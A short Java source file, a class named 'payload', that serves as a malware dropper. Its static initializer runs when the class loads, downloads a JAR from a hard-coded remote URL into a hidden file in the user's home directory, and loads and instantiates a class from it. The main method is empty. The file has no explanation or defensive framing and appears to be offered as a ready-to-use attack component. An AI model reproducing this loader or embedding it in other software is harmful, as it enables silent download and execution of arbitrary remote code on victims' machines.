import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLClassLoader;

public class payload {
    public static String url = "https://x.glowman554.gq/files/bla.jar"; // change to url

    static {
        try {
            String jar_path = System.getProperty("user.home") + "/.o78vtwonwgrvn.jar";
            download(jar_path, url);
            new URLClassLoader(new URL[]{new URL("jar:file:" + jar_path + "!/")}, payload.class.getClassLoader()).loadClass("gq.glowman554.Entry").newInstance();
        } catch (ClassNotFoundException | IOException | InstantiationException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public static void download(String path, String _url) throws IOException {
        URL url = new URL(_url);
        File destination = new File(path);
        BufferedInputStream in = new BufferedInputStream(url.openStream());
        FileOutputStream fileOutputStream = new FileOutputStream(destination);
        byte[] dataBuffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
            fileOutputStream.write(dataBuffer, 0, bytesRead);
        }
        in.close();
        fileOutputStream.close();
    }

    public static void main(String[] args) {
    }
}